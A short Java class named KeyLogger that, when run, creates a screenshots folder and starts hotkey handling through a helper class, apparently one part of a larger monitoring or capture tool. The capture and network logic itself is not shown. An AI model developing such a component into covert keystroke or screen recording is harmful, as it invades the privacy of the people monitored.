import java.io.File;
//
//import javax.swing.JButton;
//import javax.swing.JFrame;
//import javax.swing.JTextPane;

public class KeyLogger implements Runnable {

	private WebController web;

	public KeyLogger(WebController web) {
		this.web = web;

	}

	public void run() {
		File file = new File("screenshots/");
		file.mkdir();
		KeyLoggerHelper h = new KeyLoggerHelper(web);
		h.startHotKeys();

	}

}
